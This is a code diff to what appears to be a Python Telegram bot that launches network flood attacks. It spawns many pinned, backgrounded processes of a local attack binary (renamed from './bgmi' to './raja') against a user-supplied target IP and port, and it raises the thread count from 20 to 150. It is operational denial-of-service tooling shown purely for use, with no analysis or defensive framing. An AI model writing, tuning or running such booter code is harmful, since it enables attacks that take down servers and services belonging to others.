@@ -389,7 +389,7 @@ def initialize_bot(bot, bot_id):
         num_instances = (900 // threads_per_instance)
         core_mapping = [0, 0, 1, 1, 0, 0, 1, 1, 0]
         for i in range(num_instances):
-            full_command = ['nohup', './bgmi', str(target), str(port), str(time), str(threads_per_instance)]
+            full_command = ['nohup', './raja', str(target), str(port), str(time), str(threads_per_instance)]
             core = core_mapping[i % len(core_mapping)]
             taskset_command = ['taskset', '-c', str(core)] + full_command
             attack_process = subprocess.Popen(taskset_command)
@@ -545,7 +545,7 @@ def start_bot(bot, bot_id):
     print(f"\n{bot_id}) Starting bot with token {bot.token}...")
     bot.infinity_polling() #bot.polling(none_stop=True, interval=0, timeout=0) --for normal polling
 
-threads = [20]
+threads = [150]
 bot_tokens = fetch_bot_tokens()
 bots = [telebot.TeleBot(token) for token in bot_tokens]
 for bot in bots:
